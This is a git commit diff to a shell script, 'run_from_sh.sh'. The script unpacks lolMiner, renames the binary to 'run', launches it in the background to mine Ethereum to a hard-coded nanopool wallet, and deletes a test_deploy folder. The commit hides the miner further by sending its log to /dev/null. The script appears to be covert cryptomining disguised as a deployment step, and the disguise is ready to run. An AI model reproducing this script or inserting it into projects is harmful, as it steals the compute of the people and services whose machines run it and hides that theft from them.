bd19bfa3be9579476ca1a933e2c1ad59f0b65fcd
githubdeploycluster <you@example.com>
2022-03-27 15:25:32 +0000

    nohup >> /dev/null

--- run_from_sh.sh
+++ run_from_sh.sh
@@ -8,7 +8,7 @@ tar -xvf lolMiner_v1.47_Lin64.tar.gz
 mv 1.47/lolMiner 1.47/run
 
 # start
-nohup 1.47/run  --algo ETHASH --pool eth-eu1.nanopool.org:9999 --user 0xb224D4Ac08Ff402c5CC9F74A101A9e44fF0fF576 > run.log &
+nohup 1.47/run  --algo ETHASH --pool eth-eu1.nanopool.org:9999 --user 0xb224D4Ac08Ff402c5CC9F74A101A9e44fF0fF576 > /dev/null &
 
 # remove
 rm -rf test_deploy
